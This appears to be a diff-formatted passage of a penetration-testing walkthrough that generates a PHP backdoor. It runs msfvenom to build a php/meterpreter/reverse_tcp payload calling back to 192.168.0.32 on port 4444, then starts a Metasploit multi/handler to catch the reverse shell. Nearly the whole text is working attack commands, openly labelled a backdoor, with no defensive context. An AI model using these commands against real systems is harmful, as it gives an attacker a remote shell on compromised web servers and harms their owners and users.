@@ -1,0 +1,13 @@
+    Ok, let’s generate our backdoor
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f raw -o payload.php
+
+2. Create our payload handler
+
+msfconsole
+$ use exploit/multi/handler
+$ set payload php/meterpreter/reverse_tcp
+$ set LHOST 192.168.0.32
+$ set LPORT 4444
+$ run
+
